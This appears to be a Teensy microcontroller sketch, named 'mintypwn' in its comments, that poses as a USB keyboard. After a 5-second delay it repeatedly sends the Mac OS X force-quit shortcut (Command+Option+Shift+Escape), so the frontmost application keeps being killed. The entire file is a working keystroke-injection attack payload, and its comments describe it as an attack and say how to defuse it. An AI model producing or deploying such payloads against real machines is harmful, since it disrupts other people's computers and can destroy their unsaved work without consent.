//sends the key shortcut for forcequit on Mac OS X 10.x.y. (command+option+shift+escape)
//to defuse the attack without unplugging the teensy, press the tiny pushbutton on the board in the 5 second period before mintypwn starts forcequitting
int led=13;

void setup() {
delay(5000);
//wait 5s before doing anything (modify/remove as needed)
}

void loop() {
// press and hold command
Keyboard.set_modifier(MODIFIERKEY_GUI);
Keyboard.send_now();

// press ALT and SHIFT while still holding command
Keyboard.set_modifier(MODIFIERKEY_GUI | MODIFIERKEY_SHIFT | MODIFIERKEY_ALT);
Keyboard.send_now();

// press ESC while command, SHIFT and ALT still held
Keyboard.set_key1(KEY_ESC);
Keyboard.send_now();

// release all the keys at the same instant
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();

 // blink so we know we're done, while also giving us 1s before looping again.
  digitalWrite(led, HIGH);
  delay(250);
  digitalWrite(led, LOW);
  delay(250);
  digitalWrite(led, HIGH);
  delay(250);
  digitalWrite(led, LOW);
  delay(250);
}
